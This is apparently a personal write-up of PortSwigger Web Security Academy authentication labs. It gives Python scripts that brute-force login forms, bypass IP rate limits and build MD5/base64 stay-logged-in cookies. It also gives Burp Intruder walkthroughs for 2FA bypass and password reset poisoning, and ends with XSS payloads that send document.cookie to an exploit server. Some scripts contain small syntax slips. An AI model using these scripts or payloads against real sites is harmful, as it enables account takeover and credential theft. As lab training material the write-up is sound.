---
title: Authentication practice PortSwigger Labs
date: 2023-1-25 00:18:00 +0800
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [Web Hacking]
---

## Vulnerabilities in password-based login
```python
#!/usr/bin/python3
from pwn import * 
import requests, signal, time, pdb, pdb, sys, string

def def_handler(sig, frame):
    print("Exiting... ")
    sys.exit(1)

if len(sys.argv) != 3:
    print(" [!] Usage: python3 auth.py <user_list> <pass_list>")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

main_url = "https://0adf001d03974206c0a22e1600ac0013.web-security-academy.net/login"
usernames = sys.argv[1]
passwords = sys.argv[2]
header = {"Content-Type": "application/x-wwww-form-urlencoded"}
cookies = {"session": "session=5htTCZYZY03nVAJYPMCvSCPqmxDhrnfvPl"}
fp = open(usernames)
user_list= fp.read()
fp = open(passwords)
pass_list = fp.read()

def getAccess(): 
    for user in user_list.splitlines():
     for password in pass_list.splitlines():
        print(" [+] Testing user: %s and password: %s" % (user, password)) 
        data = "username=" + user + "&password=" + password
        r = requests.post(main_url, data=data, headers=header, cookies=cookies)
        if "Your username is" in r.text:
            print(" [+] Credentials found: %s:%s" % (user, password))
            break
        
if __name__=='__main__':
    getAccess()
```

## Bypassing two-factor authentication
```shell
Sometimes, the 2FA verification is done on another page which can be bypassed. 
For our case, as we have access to the 2FA of the user wiener:peter, we can see that once inside we will be redirected to 
POST /my-account HTTP/1.1 so we can copy that POST header and paste it in the 2FA page of the user carlos:montoya.
```

## Flawed two-factor verification logic
```shell
We intercept the request and when we get to post /login2, which is the FA, we change the verify=wiener to verify=carlos, 
but as we do not know the mfa-code (2FA), we will have to brute-force it. To do this, we create a quick list of numbers from 0000 to 9999:
seq 0000 9999 > list.txt
And we load it to the intruder, choosing the mfa-code as the field to brute-force. Finally we will have a 302 response code 
indicating the code of the user carlos which we can use to access the page. 
```

## Resetting passwords using a URL
```shell
We simply send a password change to user wiener (because we have access to him and his email), access the password change link, 
intercept it with burpsuite and change the parameter user=wiener to user=carlos, and we will be able to access carlos's account with the password 
we have chosen. 
```

## Username enumeration via subtly different responses
```shell
We simply intercept the request, and brute-force the user (since this is what the exercise asks us to do). 
However, we have to add the text "Invalid username or passsword." as Grep-Extract. 
To do this: Intruder>options>Grep-Extract and select that piece of text. 
When the intruder finishes, we will see that there is a user that makes the request by POST instead of GET, 
so already having the user we can brute-force the password.
```

## Username enumeration via response timing
```shell
 First of all, as the exercise has an IP restriction, we are going to introduce an X-Forwarded-For header.
 With this, what we will achieve will be to "change" IP each time we make a request,
 this way the page will not block the IP for 30 minutes each time we make a request.
 For it: Proxy>Options>Math and Replace > Add > type: Request header, replace:X-Forwarded-For: [IP] (I have put mine).
 Once we have this header and intercept any request, it will appear and we will be able to change it. 

Once we have this configured, we go to the intruder, and select attack type > Pitchfork,
since we need to introduce 2 payloads: one to change the IP every time we make a request and another the username. 
We load a payload with the list of users provided by burpsuite and add our user "wiener", which we know exists.  
If we run the Intruder (and click on the columns tab to add the response time), 
we will see that wiener and another user take longer than normal to respond (in my case 480ms and 490ms respectively, 
while the others took less than 300) so we already have the user X. 
We return to the intruder, and change the field to brute-force the password, putting the user that we have already discovered.
```
## Broken brute-force protection, IP block
```python
#!/usr/bin/python3

from pwn import *
import requests, signal, time, pdb, pdb, sys, string, click

def def_handler(sig, frame):
    print("Exiting...").
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 2:
    print("Usage mode: python3 block.py <file>")
    sys.exit(1)


main_url="https://0a94002003aa4822c03b4a180005005f.web-security-academy.net/login"
header = {"Content-Type": "application/x-www-form-urlencoded"}
cookies = {"session": "session=wsd3yKlA5dlkyKS98Ws5SzdW8gZPbEtQ"}
file = sys.argv[1]

fp=open(sys.argv[1], "r")
list=fp.read()
with open(sys.argv[1]) as file:
    lines = [i.strip() for i in file]


def getAccess():
    for password in lines:
        if (lines.index(password)+1) % 3 == 0:
            print(" [+] putting in wiener credentials").
            r=requests.post(main_url, headers=header, cookies=cookies, data = "username=wiener&password=peter")
            sleep(1)
            if r.status_code == 302:
                print(" [+] wiener credentials accepted.")
                new_main_url="https://0a94002003aa4822c03b4a180005005f.web-security-academy.net/login"
                r=requests.post(new_main_url, headers=header, cookies=cookies, data = "username=carlos&password=%s" % lines[lines.index(passwo
rd)])
                sleep(1)
                if "username" in r.text:
                    print("something is wrong")
        else:
            print(" [+] Trying user: carlos and password:%s" % lines[lines.index(password)-1])
            r=requests.post(main_url, headers=header, cookies=cookies, data = "username=carlos&password=%s" % lines[lines.index(password)-1])
            sleep(1)
            if r.status_code == 302:
                print("Password found: %s" % (password))
                break
if __name__ == "__main__":
    getAccess()

 To apply the script, you need to change your main_url and cookies (and have a file with the passwords you want to test).

 Another existing option is to use the burp intruder:
 1-Send a request with wiener:peter and send it to the intruder.
 2-Create a pitchfork attack (to put several payloads in different positions) and mark the user and password as positions to brute-force.
 3-Enter the resource pool>resource pool>add the attack with concurrent requests = 1 (to send a request one by one, 
   following the order we want correctly)
 4-In the payload>set1>and add a list where we repeat wiener, carlos but 100 times each one.
 5-We do the same with the list of passwords, but after each password we add "peter", because this is the password of our account "wiener",
   to reset the IP. And we add this to the 2nd set of the payload.
 6-Now it is time to wait until we see a status code 302, and in this way we will already have the credentials of carlos.
```

## Account locking
```shell
 capture a request with any username and password, and send it to the intruder. 
 In the payload, we load the same list of users X number of times (I chose 3, for example), because this way when entering several times the same user,
 we will see that one of them gives us a "Length" in the answer different from the others, so we know that this user is the correct one. 
 Now it is time to enumerate the password. 
 To do this, we must take into account that every 3 failed password attempts, the account is blocked for 1 minute. 
 Therefore, once we know the user, we send again the request to the intruder, and select the password field to brute-force. 
 We add the list of passwords as payload, and then we go to Intruder>Options>Grep-Extract and select the error that we get when we are blocked.
 We run the Intruder, and we will see that there will be a combination which reports us this error (the column remains blank), therefore, 
 we know that this is the password.
```

```python
import os
from pwn import *
import hashlib, signal, pdb, pdb, sys, base64

def def_handler(sig, frame):
    print("Exiting...").
    sys.exit(1)

if len(sys.argv) != 3:
    print("Add a list of passwords and a destination file").
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

f=open(sys.argv[2], "a")

fp=open(sys.argv[1], "r")
list=fp.readlines()
with open(sys.argv[1], "r") as file:
    lines = [i.strip() for i in file]


def encrypt():
    for password in lines:
        result = hashlib.md5(password.encode())
        message = "carlos:" + result.hexdigest()
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        f.write(base64_message+"\n")
    
if __name__ == "__main__":
    encrypt()
```

## Brute-forcing a stay-logged-in cookie
```shell
 if we log into the page with wiener:peter and parse the logged-in-cookie we see that it is encoded in base64, 
 following the following pattern user:password_in_hash_md5. Therefore, as we already have the user carlos, we have to concatenate the password 
 following the previous format and finally encode it in base64. 
 To do this, we have 2 options: Do it using a python script(which I will expose below) or use the Payload Processing as follows:
 We exit the wiener account, activate burp's Intercept and capture the first request that has GET /my-account HTTP/1.1.
 Select the cookie field to apply brute force to it
 Then, we go to intruder > payloads > Payload Processing
 Hash: MD5
 Add prefif: carlos:
 Encode: Base64-encode
 And finally we put the list of passwords provided by portswigger as payload. 
 We run the intruder and we will see that there is a request that has a larger response size (Length) than the others, 
 so we already know what the password is.
```

```python
 We have to pass 2 parameters to the script: a file containing the passwords we want to encode and a destination file.
 Example: python3 <script.py> passwords.txt encoded.txt

import os
import hashlib, signal, pdb, pdb, sys, base64

def def_handler(sig, frame):
    print("Exiting...").
    sys.exit(1)

if len(sys.argv) != 3:
    print("Add a list of passwords and a destination file").
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

f=open(sys.argv[2], "a")
fp=open(sys.argv[1], "r")

list=fp.readlines()
with open(sys.argv[1], "r") as file:
    lines = [i.strip() for i in file]


def encrypt():
    for password in lines:
        result = hashlib.md5(password.encode())
        message = "carlos:" + result.hexdigest()
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        f.write(base64_message+"\n")
if __name__ == "__main__":
    encrypt()

Having already a .txt file with the passwords encoded following the pattern, we can skip the Payload Processing step, 
loading directly the .txt file as payload, and it will give us the same results as the previous method.
```
## Password reset poisoning
```shell
First let's test the password reset with our account. 
If we analyze it, we see that the reset link cannot be manipulated, since it contains a unique password reset token. 
However, we have a clue in the lab name itself: middleware, so we know that we can manipulate the request to send it to a "third party". 
Searching a bit on google, we can find the X-Forwarded-Host header, which allows us to redirect the request wherever we want, 
so we will intercept a new request for the user "carlos" and send it to our exploit server (id.exploit-server.net). 
As we know that Carlos will click on any link he receives, we access the "Acess Log" section and we will see a request from a different IP, 
which presents a password reset link with a token (carlos's), so we put it in the URL and reset carlos's password, being able to access his account. 
```


## Password brute-force via password change
```shell
 If we access the change password field with the user weiner, and try combinations:
 - Meter Current password correct and the new password matched in the 2 fields: The password is changed.
 - Enter the correct current password but the new passwords are different: it throws error that these passwords do not match.
 - Enter a wrong current password but the new passwords match: throw error that the current password is not correct.

Therefore, we can brute-force the current password field by changing the user-id to carlos until we don't get 
the message "Current password isn't correct".
```

## Offline password cracking
```shell
 In this case, we know that the comments section is vulnerable to XSS, so we test the different fields. 
Finally, we see that the vulnerable one is the comment one, so we introduce a document.location element, which works as a URL redirector that takes 
us to the specified page. Therefore, we introduce the URL of the exploit server, creating a script as follows:
<script>document.location="url_exploit_server_exploit_server "+document.cookie</script>.
And we send it. So, any user who is on the web page and accesses that comment section, 
will be directed to the url of the exploit server, his cookie will be extracted and finally he will be redirected to the comment page again. 

Another way to do this is to use window location assign to redirect the user to any page of our interest. So, the script would look like this:
<script>window.location.assign("url_exploit_attacker_server "+document.cookie)</script>
```
